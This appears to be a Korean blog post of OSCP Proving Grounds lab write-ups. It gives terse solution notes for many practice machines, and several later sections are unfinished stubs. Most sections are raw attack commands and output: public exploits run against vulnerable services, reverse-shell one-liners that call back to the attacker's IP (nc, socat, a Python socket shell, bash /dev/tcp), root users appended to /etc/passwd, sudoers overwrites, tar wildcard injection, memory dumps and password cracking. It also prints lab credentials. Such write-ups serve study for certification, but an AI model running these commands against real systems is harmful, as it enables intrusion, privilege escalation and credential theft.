---
layout: post
title: OSCP Proving Ground
subtitle: OSCP Proving Ground WriteUp
author: g3rm
categories:
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
  - OSCP
sidebar:
---

## Info
OSCP 자격증 합격을 위해 유용한 문제들로 구성된 [리스트](https://docs.google.com/spreadsheets/d/18weuz_Eeynr6sXFQ87Cd5F0slOj9Z6rt/edit?pli=1&gid=487240997#gid=487240997)를 참고하여 풀이 방법을 남깁니다.

## Linux 
### ClamAV : 25 SMTP
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.xxx.xxx -oN xxx.xxx_allport
PORT      STATE SERVICE     VERSION
25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.45.185], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info

# smtp get info
snmp-check 192.168.xxx.xxx -c public
[*] Processes:

  Id                    Status                Name                  Path                  Parameters                       
  3779                  runnable              clamav-milter         /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl


# 실행중인 process 중 clamav-milter 에 취약점 있음
searchsploit clamav-milter
searchsploit -m 4761
perl 4761.pl 192.168.xxx.xxx
nc -nv 192.168.xxx.xxx 31337
```

### Pelican : Exhibitor - gcore
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.180.98 -oN 180.98_allport
8080/tcp  open  http        Jetty 1.0
|_http-server-header: Jetty(1.0)
|_http-title: Error 404 Not Found
8081/tcp  open  http        nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://192.168.180.98:8080/exhibitor/v1/ui/index.html

# 8080 : Exhibitor Web UI 1.7.1 - Remote Code Execution
# https://www.exploit-db.com/exploits/48654
$(/bin/nc -e /bin/sh kali_ip 8888 &)

# nc
nc -nvlp 8888
/usr/bin/script -qc /bin/bash /dev/null

# linpeas
python3 -m http.server 80
wget http://kali/linpeas.sh
./linpeas.sh

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                             
Matching Defaults entries for charles on pelican:                                                                                                           
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
Sudoers file: /etc/sudoers.d/charles is readable
charles ALL=(ALL) NOPASSWD:/usr/bin/gcore

                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                          
                      ╚════════════════════════════════════╝                                                                                                
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid    
-rws--x--x 1 root root 17K Sep 10  2020 /usr/bin/password-store (Unknown SUID binary!)


╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes   
root       513  0.0  0.0   2276    72 ?        Ss   09:16   0:00 /usr/bin/password-store

# GTFObins
sudo gcore $PID
sudo -u root /usr/bin/gcore -a -o <outputfile> <pid>
strings <outputfile>
001 Password: root:
ClogKingpinInning731

# root 
95cee2bcb5cb60a70ef4c6bb62a36b64
su -
Password: ClogKingpinInning731
```

### Payday : CS-Cart - sudo -l
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.207.39 -oN 207.39_allport
80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
|_http-title: CS-Cart. Powerful PHP shopping cart software

# web exploit
whatweb http://192.168.207.39
http://192.168.207.39 [200 OK] Apache[2.2.4], CS-Cart, Cookies[cart_languageC,csid,secondary_currencyC], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6], IP[192.168.207.39], Meta-Author[CS-Cart.com], PHP[5.2.3-1ubuntu6], PasswordField[password], PoweredBy[the], Script[javascript], Title[CS-Cart. Powerful PHP shopping cart software], X-Powered-By[PHP/5.2.3-1ubuntu6]

gobuster dir -u 192.168.207.39 -w /usr/share/wordlists/dirb/common.txt 
/admin.php            (Status: 200) [Size: 9483]
/admin                (Status: 200) [Size: 9483]

# admin:admin 추측
# https://www.exploit-db.com/exploits/48891 : CS-Cart 1.3.3 - authenticated RCE
Template editor에서 쉘 업로드 후 아래 url로 접근
http://192.168.207.39/skins/php-reverse-shell.phtml

# linpeas.sh 돌리기
# 별거없음

# ssh brute force
crackmapexec ssh 192.168.189.39 -u patrick -p /usr/share/wordlists/rockyou.txt
patrick:patrick
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@192.168.207.39

# escal
sudo -l
sudo su

```
### Snookums : SimplePHPGal - passwd
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.207.58 -oN 207.58_allport
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Simple PHP Photo Gallery

# web
whatweb http://192.168.207.58
http://192.168.207.58 [200 OK] Apache[2.4.6], Country[RESERVED][ZZ], Google-Analytics[UA-2196019-1], HTML5, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.4.16], IP[192.168.207.58], JQuery[1.7.2], Lightbox, PHP[5.4.16], Script, Title[Simple PHP Photo Gallery], X-Powered-By[PHP/5.4.16]

# web enum
dirsearch -u http://192.168.230.58 -w /usr/share/seclists/Discovery/Web-Content/big.txt -r -t 60 --full-url

# SimplePHPGal 0.7 - Remote File Inclusion
https://www.exploit-db.com/exploits/48424
msfvenom -p php/reverse_php LHOST=192.168.45.185 LPORT=8888 -f raw -o php_reverse_9999.pHP
http://192.168.207.58/image.php?img=http://192.168.45.185/php_reverse_8888.pHP

# config cat
cat /var/www/html/db.php
define('DBUSER', 'root');
define('DBPASS', 'MalapropDoffUtilize1337');
SimplePHPGal

# mysql login
mysql -u root -p
Enter password: MalapropDoffUtilize1337

use SimplePHPGal;
show tables;
select * from users;

Tables_in_SimplePHPGal
users
username        password
josh    VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0=
michael U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==
serena  VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==

# password decode - HockSydneyCertify123
echo -n "U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==" | base64 -d
echo -n "SG9ja1N5ZG5leUNlcnRpZnkxMjM=" | base64 -d

# linpeas
╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                                                
                                                                                                                                                            
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ /etc/passwd is writable                

# passwd 생성
openssl passwd -1 -salt password password 
echo 'owned:$1$password$Da2mWXlxe6J7jtww12SNG/:0:0:owned:/root:/bin/bash' >> /etc/passwd

```
### Bratarina : SMTP
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.207.71 -oN 207.71_allport
25/tcp  open   smtp        OpenSMTPD
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.45.185], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
445/tcp open   netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)

# smb - 레빗홀
crackmapexec smb 192.168.207.71 -u '' -p '' --shares
crackmapexec smb 192.168.207.71 -u '' -p '' --spider backups --regex .
SMB         192.168.207.71  445    BRATARINA        //192.168.207.71/backups/passwd.bak [lastm:'2020-07-06 16:46' size:1747]

smbclient //192.168.207.71/backups
get passwd.bak

# smtp
searchsploit OpenSMTPD
python3 47984.py 192.168.207.71 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.185\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'  

```
### Pebbles
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.207.52 -oN 207.52_allport
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Pebbles
3305/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: Tomcat
|_http-favicon: Apache Tomcat

# web scan
feroxbuster -u http://192.168.207.52:8080 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o 207.52:8080
feroxbuster -u http://192.168.207.52:80 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o 207.52:80
feroxbuster -u http://192.168.207.52:3305 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o 207.52:3305

[ZoneMinder] Console - [Running] - default [v1.29.0]
searchsploit zoneminder 
Zoneminder 1.29/1.30 - Cross-Site Scripting / SQL Injection / Session Fixation / Cross-Site Request Forgery               | php/webapps/41239.txt

# sql injection
searchsploit -m 41239
limit=100;SELECT SLEEP(10)#

```
### Nibbles
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.207.47 -oN 207.47_allport
5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.9

# postgres:postgres
searchsploit postgres 
PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)                                                         | multiple/remote/50847.py

searchsploit -m 50847
python3 50847.py -i 192.168.207.47 -p 5437 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.185 8888>/tmp/f'

# linpeas
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid  
-rwsr-xr-x 1 root root 309K Feb 16  2019 /usr/bin/find


```
### Hetemit 
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.207.117 -oN 207.117_allport
18000/tcp open  biimenu?
50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
|_http-title: Site doesn't have a title (text/html; charset=utf-8).

# web 50000 post
curl -X POST --data "code=os.system('socat TCP:192.168.45.185:1337 EXEC:sh')" http://192.168.121.36:50000/verify

# linpeas
╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                            
  Group cmeeks:                                                                                                                                             
/etc/systemd/system/pythonapp.service  

# 설정파일 수정
vi /etc/systemd/system/pythonapp.service 
ExecStart=/home/cmeeks/reverse.sh
User=root

# reverse shell
cat <<'EOT'> /home/cmeeks/reverse.sh 
#!/bin/bash 
socat TCP:192.168.45.185:80 EXEC:sh 
EOT
chmod +x /home/cmmeks/reverse.sh
reboot

```
### ZenPhoto
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.207.41 -oN 207.41_allport
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.14 (Ubuntu)

# web
feroxbuster -u http://192.168.207.41 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o 207.41
http://192.168.207.41/test 개발자 도구 하단 zenphoto version 1.4.1.4

# cve
searchsploit zenphoto 
ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution                                                         | php/webapps/18083.php
php 18083.php 192.168.207.41 /test/

# priv escal
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester  
[+] [CVE-2021-4034] PwnKit

wget https://codeload.github.com/berdav/CVE-2021-4034/zip/main
wget http://192.168.45.185/main
unzip main
make

```
### Nukem
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.231.105 -oN 231.105_allport
80/tcp    open  http        Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
|_http-generator: WordPress 5.5.1

wpscan --url http://192.168.231.105 
[i] Plugin(s) Identified:
[+] simple-file-list

searchsploit simple file list
WordPress Plugin Simple File List 4.2.2 - Remote Code Execution                                                           | php/webapps/48449.py

# exploit
vi 48449.py
payload = '<?php passthru("bash -i >& /dev/tcp/192.168.45.185/22 0>&1"); ?>'

# linpeas.sh
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 http root 2913 Sep 18  2020 /srv/http/wp-config.php                                                                                            
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'commander' );
define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
define( 'DB_HOST', 'localhost' );


                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                          
                      ╚════════════════════════════════════╝                                                                                                
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid    
-rwsr-xr-x 1 root root 2.5M Jul  7  2020 /usr/bin/dosbox

# exploit
LFILE='/etc/sudoers'
dosbox -c 'mount c /' -c "echo commander ALL=(ALL) ALL >>c:$LFILE" -c exit
```

### Cockpit *
```shell
# port scan 
sudo nmap -sC -sV -Pn -p- 192.168.231.10 -oN 231.10_allport
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: blaze
9090/tcp open  http    Cockpit web service 198 - 220
|_http-title: Did not follow redirect to https://192.168.231.10:9090/

# dir scan
feroxbuster -u http://192.168.231.10 -w /usr/share/dirb/wordlists/common.txt -o 231.10 -x php 
200      GET       28l       63w      769c http://192.168.231.10/login.php

# sql injection & password get
## james
echo "Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=" | base64 -d 
canttouchhhthiss@455152
## cameron
echo "dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy" | base64 -d
thisscanttbetouchedd@455152

# 9090 login & ssh key 등록
ssh-keygen -t ECDSA -f james_ecdsa
cat james_ecdsa.pub 
ssh james@192.168.231.10 -i james_ecdsa 

# exploit
sudo -l
# payload.sh
echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers
echo "" > '--checkpoint=1'  
echo "" > '--checkpoint-action=exec=sh payload.sh'
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *

```

### Clue
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.231.240 -oN 231.240_allport
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket

```

### Extplorer
```shell
# port scan
sudo nmap -sC -sV -Pn -p- 192.168.231.16 -oN 231.16_allport
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)

# dir scan
wpscan --url http://192.168.231.16
feroxbuster -u http://192.168.231.16 -w /usr/share/seclists/Discovery/Web-Content/big.txt
301      GET        9l       28w      322c http://192.168.231.16/filemanager => http://192.168.231.16/filemanager/

# admin:admin filemanager
filemanager/config/.htusers.php credential
'dora','$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS'

# crack - 레빗홀 - 이 아니고 아래에 쓰인다.
echo "$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS" > dora.hash
doraemon

# reverse shell upload
curl http://192.168.231.16/wp-admin/php-reverse-shell.php

# privilege
groups=1000(dora),6(disk)
df -h
debugfs -w /dev/mapper/ubuntu--vg-ubuntu--lv
cat /etc/shadow
root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7:::

unshadow passwd.txt shadow.txt > passwords.txt
john passwords.txt --wordlist=/usr/share/wordlists/rockyou.txt
explorer (root)

```

### Postfish - SMTP/POP3 - Email Phshing
```shell
sudo nmap 192.168.211.137 -p- -sS -sV -Pn
25/tcp open smtp Postfix smtpd  
|_smtp-commands: postfish.off, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
110/tcp open pop3 Dovecot pop3d  
|_pop3-capabilities: CAPA RESP-CODES AUTH-RESP-CODE TOP USER STLS

cewl http://postfish.off/team.html -m 5 -w team.txt 

smtp-user-enum -U team.txt -t postfish.off                                    
postfish.off: Legal exists
postfish.off: Sales exists
```

### Hawat - Issue Tracker
```shell
# sql injection
17445
30445
50050
```

### Walla - RaspAP
```shell
$ nmap -sC -sV -A 192.168.216.97 -p22,23,25,53,422,8091,42042  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 09:55 EDT  
Nmap scan report for 192.168.216.97  
Host is up (0.014s latency).  
  
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)  
| ssh-hostkey:  
| 2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)  
| 256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)  
|_ 256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)  
23/tcp open telnet Linux telnetd  
25/tcp open smtp Postfix smtpd  
|_smtp-commands: walla, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING  
| ssl-cert: Subject: commonName=walla  
| Subject Alternative Name: DNS:walla  
| Not valid before: 2020-09-17T18:26:36  
|_Not valid after: 2030-09-15T18:26:36  
|_ssl-date: TLS randomness does not represent time  
53/tcp open tcpwrapped  
422/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)  
| ssh-hostkey:  
| 2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)  
| 256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)  
|_ 256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)  
8091/tcp open http lighttpd 1.4.53  
|_http-server-header: lighttpd/1.4.53  
| http-auth:  
| HTTP/1.1 401 Unauthorized\x0D  
|_ Basic realm=RaspAP  
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).  
| http-cookie-flags:  
| /:  
| PHPSESSID:  
|_ httponly flag not set  
42042/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)  
| ssh-hostkey:  
| 2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)  
| 256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)  
|_ 256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)  
Service Info: Host: walla; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### PC - rpc.py
```shell
22
8000
```

### Apex - OpenEMR/Filemanager
```shell
# Nmap  
PORT STATE SERVICE VERSION  
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))  
|_http-title: APEX Hospital  
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34  
|_http-server-header: Apache/2.4.29 (Ubuntu)  
| http-methods:  
|_ Supported Methods: HEAD GET POST OPTIONS  
445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)  
3306/tcp open mysql MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1  
| mysql-info:  
| Protocol: 10  
| Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1  
| Thread ID: 33  
| Capabilities flags: 63487  
| Some Capabilities: SupportsTransactions, Speaks41ProtocolOld, Support41Auth, InteractiveClient, LongPassword, LongColumnFlag, IgnoreSigpipes, Speaks41ProtocolNew, FoundRows, IgnoreSpaceBeforeParenthesis, ODBCClient, SupportsCompression, ConnectWithDatabase, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults  
| Status: Autocommit  
| Salt: D+HgO4W;]CvJN)~cVdr0  
|_ Auth Plugin Name: mysql_native_password
```

### Sorcerer - scp/authorized key
```shell
sudo nmap -Pn -n $IP -sC -sV -p- --open  
[sudo] password for kali:  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-13 09:24 EST  
Nmap scan report for 192.168.195.100  
Host is up (0.085s latency).  
Not shown: 65524 closed tcp ports (reset), 1 filtered tcp port (no-response)  
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit  
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)  
| ssh-hostkey:  
| 2048 81:2a:42:24:b5:90:a1:ce:9b:ac:e7:4e:1d:6d:b4:c6 (RSA)  
| 256 d0:73:2a:05:52:7f:89:09:37:76:e3:56:c8:ab:20:99 (ECDSA)  
|_ 256 3a:2d:de:33:b0:1e:f2:35:0f:8d:c8:d7:8f:f9:e0:0e (ED25519)  
80/tcp open http nginx  
|_http-title: Site doesn't have a title (text/html).  
111/tcp open rpcbind 2-4 (RPC #100000)  
| rpcinfo:  
| program version port/proto service  
| 100000 2,3,4 111/tcp rpcbind  
| 100000 2,3,4 111/udp rpcbind  
| 100003 3 2049/udp nfs  
| 100003 3,4 2049/tcp nfs  
| 100005 1,2,3 44362/udp mountd  
| 100005 1,2,3 45093/tcp mountd  
| 100021 1,3,4 41331/tcp nlockmgr  
| 100021 1,3,4 58919/udp nlockmgr  
| 100227 3 2049/tcp nfs_acl  
|_ 100227 3 2049/udp nfs_acl  
2049/tcp open nfs 3-4 (RPC #100003)  
7742/tcp open http nginx  
|_http-title: SORCERER  
8080/tcp open http Apache Tomcat 7.0.4  
|_http-title: Apache Tomcat/7.0.4  
|_http-favicon: Apache Tomcat  
41331/tcp open nlockmgr 1-4 (RPC #100021)  
44667/tcp open mountd 1-3 (RPC #100005)  
45093/tcp open mountd 1-3 (RPC #100005)  
45151/tcp open mountd 1-3 (RPC #100005)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Sybaris - Redis/FTP/crontap.so

### Peppo - docker group
```shell
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)  
|_auth-owners: root  
| ssh-hostkey:  
| 2048 754c0201fa1e9fcce47b52feba3685a9 (RSA)  
| 256 b76f9c2bbffb0462f418c938f43d6b2b (ECDSA)  
|_ 256 987fb640cebbb557d5d13c65727487c3 (ED25519)  
113/tcp open ident FreeBSD identd  
|_auth-owners: nobody  
5432/tcp open postgresql PostgreSQL DB 12.3 - 12.4  
8080/tcp open http WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))  
| http-robots.txt: 4 disallowed entries  
|_/issues/gantt /issues/calendar /activity /search  
|_http-server-header: WEBrick/1.4.2 (Ruby/2.6.6/2020-03-31)  
|_http-title: Redmine  
10000/tcp open snet-sensor-mgmt?  
| fingerprint-strings:  
| DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:  
| HTTP/1.1 400 Bad Request  
| Connection: close  
| FourOhFourRequest:  
| HTTP/1.1 200 OK  
| Content-Type: text/plain  
| Date: Fri, 20 Jan 2023 11:29:37 GMT  
| Connection: close  
| Hello World  
| GetRequest:  
| HTTP/1.1 200 OK  
| Content-Type: text/plain  
| Date: Fri, 20 Jan 2023 11:29:26 GMT  
| Connection: close  
| Hello World  
| HTTPOptions:  
| HTTP/1.1 200 OK  
| Content-Type: text/plain  
| Date: Fri, 20 Jan 2023 11:29:27 GMT  
| Connection: close  
|_ Hello World  
|_auth-owners: eleanor
```

### Hunit - ssh + git push
```shell
소스코드 일일히 다 보기
```

### Readys - Redis rce - PHP shell - LFI
```shell
6379
```

### Astronaut - Grav

### Bullybox - Boxbilling - .git 

### Marketing - LimeSurvey - mlocate group

### Exfiltrated - Subrion - exif tool

### Fanatastic - grafana - Disk group
```shell
└─$ sudo nmap -Pn -n $IP -sC -sV -p- --open  
[sudo] password for kali:  
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-26 10:09 EDT  
Nmap scan report for 192.168.193.181  
Host is up (0.087s latency).  
Not shown: 63966 closed tcp ports (reset), 1566 filtered tcp ports (no-response)  
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit  
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:  
| 3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)  
| 256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)  
|_ 256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)  
3000/tcp open ppp?  
| fingerprint-strings:  
| FourOhFourRequest:  
| HTTP/1.0 302 Found  
| Cache-Control: no-cache  
| Content-Type: text/html; charset=utf-8  
| Expires: -1  
| Location: /login  
| Pragma: no-cache  
| Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax  
| X-Content-Type-Options: nosniff  
| X-Frame-Options: deny  
| X-Xss-Protection: 1; mode=block  
| Date: Tue, 26 Sep 2023 14:10:21 GMT  
| Content-Length: 29  
| href="/login">Found</a>.  
| GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:  
| HTTP/1.1 400 Bad Request  
| Content-Type: text/plain; charset=utf-8  
| Connection: close  
| Request  
| GetRequest:  
| HTTP/1.0 302 Found  
| Cache-Control: no-cache  
| Content-Type: text/html; charset=utf-8  
| Expires: -1  
| Location: /login  
| Pragma: no-cache  
| Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax  
| X-Content-Type-Options: nosniff  
| X-Frame-Options: deny  
| X-Xss-Protection: 1; mode=block  
| Date: Tue, 26 Sep 2023 14:09:50 GMT  
| Content-Length: 29  
| href="/login">Found</a>.  
| HTTPOptions:  
| HTTP/1.0 302 Found  
| Cache-Control: no-cache  
| Expires: -1  
| Location: /login  
| Pragma: no-cache  
| Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax  
| X-Content-Type-Options: nosniff  
| X-Frame-Options: deny  
| X-Xss-Protection: 1; mode=block  
| Date: Tue, 26 Sep 2023 14:09:55 GMT  
|_ Content-Length: 0  
9090/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)  
| http-title: Prometheus Time Series Collection and Processing Server  
|_Requested resource was /graph
```

### QuackerJack - rConfig
```shell
└─$ sudo nmap -Pn -n $IP -sC -sV -p- --open  
[sudo] password for kali:  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-18 14:49 EST  
Nmap scan report for 192.168.151.57  
Host is up (0.15s latency).  
Not shown: 65527 filtered tcp ports (no-response)  
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit  
PORT STATE SERVICE VERSION  
21/tcp open ftp vsftpd 3.0.2  
| ftp-syst:  
| STAT:  
| FTP server status:  
| Connected to ::ffff:192.168.45.160  
| Logged in as ftp  
| TYPE: ASCII  
| No session bandwidth limit  
| Session timeout in seconds is 300  
| Control connection is plain text  
| Data connections will be plain text  
| At session startup, client count was 1  
| vsFTPd 3.0.2 - secure, fast, stable  
|_End of status  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
|_Can't get directory listing: TIMEOUT  
22/tcp open ssh OpenSSH 7.4 (protocol 2.0)  
| ssh-hostkey:  
| 2048 a2:ec:75:8d:86:9b:a3:0b:d3:b6:2f:64:04:f9:fd:25 (RSA)  
| 256 b6:d2:fd:bb:08:9a:35:02:7b:33:e3:72:5d:dc:64:82 (ECDSA)  
